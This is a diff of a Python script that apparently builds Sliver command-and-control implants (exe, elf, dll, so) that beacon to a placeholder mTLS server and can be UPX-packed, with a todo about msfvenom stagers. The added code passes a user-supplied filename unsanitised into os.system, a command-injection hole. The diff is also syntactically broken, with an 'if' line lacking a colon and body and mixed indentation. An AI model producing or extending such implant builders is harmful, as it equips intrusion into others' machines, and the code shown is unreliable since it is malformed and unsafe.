@@ -60,8 +60,8 @@ async def main(args):
 	else:
 		error("unsupported OS")
 
-
-	output_filename=args.output
+	if args.output:
+		output_filename = args.output
 
 	ImplantC2 = client_pb2.ImplantC2(URL="mtls://IP:port")
 
@@ -73,16 +73,14 @@ async def main(args):
 	if args.upx == True:
 		print("compressing")
 		try:
-			os.exec
+			os.system(f'upx -9 {output_filename}')
 		except Exception as e:
 			raise e
-
-
 
 if __name__ == '__main__':
 
 	parser = argparse.ArgumentParser()
-	parser.add_argument('-f', '--format', choices=["exe", "elf", "dll", "so"], help='format to generate')
+	parser.add_argument('-f', '--format',choices=["exe", "elf", "dll", "so"], help='format to generate')
 	parser.add_argument('-o', '--output', help='file to write to')
 
 
@@ -95,10 +93,12 @@ if __name__ == '__main__':
 
 	args = parser.parse_args()
 
+	if not args.format
+
     loop = asyncio.get_event_loop()
     loop.run_until_complete(main(args))
 
-
+# todo: stagers avec msfvenom
 
 
 # https://sliverpy.readthedocs.io/en/latest/protobuf/client_pb2.html#sliver.pb.clientpb.client_pb2.ImplantConfig
